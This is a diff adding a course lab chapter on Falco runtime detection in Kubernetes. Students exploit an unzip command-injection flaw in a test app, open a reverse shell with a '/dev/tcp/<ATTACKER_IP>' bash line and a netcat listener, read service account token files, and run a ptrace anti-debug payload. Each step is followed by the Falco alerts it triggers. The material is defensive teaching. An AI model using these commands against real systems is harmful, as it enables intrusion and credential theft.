@@ -1,0 +1,204 @@
+\chapter{Runtime Threat Detection}
+
+In this section, we will simulate a real-world attack against our vulnerable application and observe how Falco detects it. Containers are designed to run isolated applications, but vulnerabilities within the application code itself can be exploited to bypass these boundaries. When an attacker gains remote code execution (RCE) inside a container, they often try to establish a foothold to further explore the cluster, access sensitive secrets mounted in the pod, or perform lateral movements towards other containers.
+
+\section{The Attack Scenario}
+
+The \texttt{zipapp} application is vulnerable to Command Injection. The application takes a user-uploaded ZIP file and extracts it using the Linux \texttt{unzip} command. Command injections occur when an application passes unsafe user-supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this specific case, an attacker can exploit this by crafting a malicious ZIP file that contains specific filenames acting as flags for the \texttt{unzip} binary (e.g., \texttt{-T} and \texttt{-TT}), fooling the application into executing arbitrary scripts during the extraction phase.
+
+For this lab, we will use this vulnerability to spawn a \textbf{Reverse Shell}. A Reverse Shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using code or command execution is achieved. This technique is often preferred by attackers over a Bind Shell (where the target opens a port and waits for the attacker to connect) because it easily bypasses ingress firewall rules and Network Address Translation (NAT) restrictions, since outbound traffic is rarely filtered as strictly as inbound traffic.
+
+\subsection{Preparing the Attacker Listener}
+
+In a real scenario, the attacker would set up a listener on a public IP address or a compromised external server. To avoid networking issues and external dependencies on the CrownLabs environment, we will simulate the attacker's machine by deploying a dedicated pod directly inside the cluster. This pod will act as our listener.
+
+Deploy the attacker pod:
+\begin{lstlisting}[language=bash]
+cat <<EOF > attacker-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker
+spec:
+  containers:
+  - name: ubuntu
+    image: ubuntu
+    command: ['sleep', 'infinity']
+EOF
+kubectl apply -f attacker-pod.yaml
+\end{lstlisting}
+
+Wait for the pod to be running, then find its IP address:
+\begin{lstlisting}[language=bash]
+kubectl get pod attacker -o jsonpath='{.status.podIP}'
+\end{lstlisting}
+
+Take note of this IP (e.g., \texttt{10.244.0.8}). Now, let's install \texttt{netcat} on the attacker pod and start listening for incoming connections on port 4444:
+
+\begin{lstlisting}[language=bash]
+kubectl exec -it attacker -- apt-get update
+kubectl exec -it attacker -- apt-get install -y netcat-openbsd
+kubectl exec -it attacker -- nc -lvnp 4444
+\end{lstlisting}
+
+Leave this terminal open. It is waiting for the reverse shell connection.
+
+\section{Executing the Exploit}
+
+Open a new terminal. The malicious payload \texttt{reverse\_shell.zip} is already included in the \texttt{material/payloads} directory. 
+The payload contains a bash script named \texttt{evil} with the following content:
+
+\begin{lstlisting}[language=bash]
+#!/bin/bash
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+\end{lstlisting}
+\textit{(Where <ATTACKER\_IP> is the IP of your attacker pod).}
+
+Now, interact with the application:
+\begin{enumerate}
+    \item Find the NodePort of the \texttt{zipapp} service (\texttt{kubectl get svc zipapp}) or use port-forwarding:
+    \begin{lstlisting}[language=bash]
+kubectl port-forward service/zipapp 4000:4000
+    \end{lstlisting}
+    \item Open your browser and navigate to \texttt{http://localhost:4000}.
+    \item Log in with any username and password.
+    \item Upload the \texttt{reverse\_shell.zip} file.
+    \item Once uploaded, click the \textbf{``Download All''} button to trigger the vulnerable zip function.
+\end{enumerate}
+
+Go back to your first terminal (the attacker listener). You should see that a connection has been established!
+
+\begin{lstlisting}[language=bash]
+Listening on 0.0.0.0 4444
+Connection received on 10.244.0.5 42502
+root@zipapp-5ffd444d74-jbwq2:/tmp/80bddfd...# 
+\end{lstlisting}
+
+You now have a root shell inside the \texttt{zipapp} container.
+
+\section{Analyzing Falco Alerts}
+
+The attack was successful: you now have root access inside the application container, demonstrating how a simple code vulnerability can compromise the entire pod. However, Falco was actively monitoring the system calls executed by the kernel. Unlike traditional security tools that rely on static signatures or network traffic, Falco operates at the kernel level using eBPF, giving it deep visibility into every action performed by the containerized processes. 
+
+Let's see what Falco recorded during the exploit. Open a third terminal and check the logs of the Falco daemonset:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
+Scan the Falco logs. Can you find the alert related to the reverse shell? What is the name of the rule that was triggered?
+\end{tcolorbox}
+
+You should find an entry similar to this:
+
+\begin{lstlisting}[language=bash]
+Notice Redirect stdout/stdin to network connection | gparent=sh ggparent=zip gggparent=python3 fd.sip=10.244.0.8 connection=10.244.0.5:42502->10.244.0.8:4444 lport=42502 rport=4444 fd_type=ipv4 fd_proto=tcp evt_type=dup3 user=root user_uid=0 process=bash proc_exepath=/bin/bash parent=bash command=bash evil ... container_name=zipapp 
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
+Analyze the output of the alert.
+\begin{itemize}
+    \item What is the \texttt{evt\_type} (System Call) that triggered the rule?
+    \item Look at the process lineage (\texttt{process}, \texttt{parent}, \texttt{gparent}, \texttt{ggparent}). Does it perfectly describe how the exploit works under the hood?
+\end{itemize}
+\end{tcolorbox}
+
+\section{Post-Exploitation: Kubernetes Secret Theft}
+
+Obtaining a shell inside a container is often just the first step. A sophisticated attacker will immediately pivot to explore what additional resources they can access. One of the most critical and common post-exploitation techniques in Kubernetes is the theft of the \textbf{Service Account Token}.
+
+By default, Kubernetes automatically mounts a service account token inside every pod at a well-known path:
+\begin{center}
+\texttt{/var/run/secrets/kubernetes.io/serviceaccount/token}
+\end{center}
+This token is a signed JSON Web Token (JWT) that can be used to authenticate against the Kubernetes API server (\texttt{kube-apiserver}). Depending on the RBAC permissions associated with the service account, an attacker could use this token to list secrets, create new pods (e.g., privileged ones to escape to the host), or even take over the entire cluster. This technique is classified under \textit{MITRE ATT\&CK for Containers T1528: Steal Application Access Token}.
+
+\subsection{Executing the Token Theft}
+
+From the reverse shell you obtained in the previous section, run the following commands to read the token and the cluster's CA certificate:
+
+\begin{lstlisting}[language=bash]
+# From inside the zipapp container's reverse shell:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+\end{lstlisting}
+
+The token will be printed on screen as a long base64-encoded string. Additionally, note the namespace the pod is running in:
+
+\begin{lstlisting}[language=bash]
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+\end{lstlisting}
+
+The token could then be used from any machine with network access to the API server to attempt further exploitation.
+
+\subsection{Falco Detection: Read Sensitive File Untrusted}
+
+Falco ships with a built-in rule specifically designed to detect this exact behavior. Open a new terminal and check the Falco logs immediately after performing the \texttt{cat} commands:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
+\end{lstlisting}
+
+You should see an alert similar to the following:
+
+\begin{lstlisting}[language=bash]
+Warning Read sensitive file untrusted | proc_exepath=/bin/cat gparent=bash ggparent=sh gggparent=unzip file=/run/secrets/kubernetes.io/serviceaccount/token user=root user_uid=0 command=cat /var/run/secrets/kubernetes.io/serviceaccount/token container_name=zipapp image=zipapp:latest
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
+Analyze the output of the new Falco alert.
+\begin{itemize}
+    \item What is the priority level of this alert? Why is it \texttt{Warning} and not \texttt{Critical}?
+    \item Notice the \texttt{gggparent=unzip} in the process lineage. What does this tell you about the full attack chain, from the ZIP upload all the way to the secret theft?
+    \item Can you think of a scenario where a legitimate process inside this container would need to read the service account token? What would be the implication for writing a custom exception for this rule?
+\end{itemize}
+\end{tcolorbox}
+
+\section{Ptrace Anti-Debug Attack}
+
+The \texttt{ptrace()} system call is a powerful Linux primitive that allows one process to observe and control the execution of another. It is the foundation of debugging tools such as \texttt{gdb} and \texttt{strace}. However, it is also commonly abused by malware authors as an \textbf{anti-debugging technique}.
+
+By invoking \texttt{ptrace(PTRACE\_TRACEME, ...)}, a process signals to the operating system that it wishes to be traced. As a side effect, no external debugger can subsequently attach to that process, since only one tracer is allowed at a time. Sophisticated malware uses this technique to detect and evade dynamic analysis environments. This behavior is classified under \textit{MITRE ATT\&CK T1622: Debugger Evasion}.
+
+In this exercise, we will upload a pre-compiled C binary that performs exactly this syscall and observe how Falco's built-in detection rule fires immediately.
+
+\subsection{Executing the Attack}
+
+The attack payload \texttt{ptrace\_payload.zip} is structured identically to the reverse shell payload, exploiting the same command injection vulnerability in \texttt{zipapp}. The archive contains the files \texttt{-T}, \texttt{-TT}, \texttt{bash evil}, and the executable \texttt{evil} script, plus a pre-compiled binary called \texttt{ptrace}. The \texttt{evil} script simply calls \texttt{./ptrace} to execute it.
+
+\begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Info]
+The \texttt{ptrace\_payload.zip} file is included in the \texttt{material/payloads} directory alongside the other lab materials.
+\end{tcolorbox}
+
+First, make sure you are \textbf{not} running an active netcat listener from the previous exercise (close that terminal if needed). Then, in a dedicated terminal, start watching the Falco logs in real time:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco -f --tail=0
+\end{lstlisting}
+
+Now upload \texttt{ptrace\_payload.zip} to the \texttt{zipapp} web interface and click \textbf{``Download All''} to trigger execution. The attack completes in less than a second -- unlike the reverse shell, it does not leave a persistent connection open.
+
+\subsection{Falco Detection: PTRACE Anti-Debug Attempt}
+
+Switch to the terminal running Falco logs. You should immediately see an alert similar to the following:
+
+\begin{lstlisting}[language=bash]
+Notice PTRACE anti-debug attempt | proc_exepath=/tmp/.../ptrace gparent=bash ggparent=sh gggparent=unzip user=root user_uid=0 process=ptrace parent=bash command=ptrace container_name=zipapp image=zipapp:latest
+\end{lstlisting}
+
+Falco has detected the \texttt{ptrace} syscall with request \texttt{PTRACE\_TRACEME} using the built-in rule \textbf{PTRACE anti-debug attempt}.
+
+\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
+\begin{itemize}
+    \item Compare the priority levels across all three attacks detected so far:
+    \begin{itemize}
+        \item Reverse Shell: \texttt{Notice}
+        \item Service Account Token Theft: \texttt{Warning}
+        \item Ptrace: \texttt{Notice}
+    \end{itemize}
+    Does the assignment of priority levels seem reasonable to you? Can you think of real-world scenarios where a \texttt{ptrace} call might be legitimate inside a container?
+    \item Look at the process lineage (\texttt{parent}, \texttt{gparent}, \texttt{ggparent}). Is it consistent with the attack chain you executed?
+\end{itemize}
+\end{tcolorbox}
+
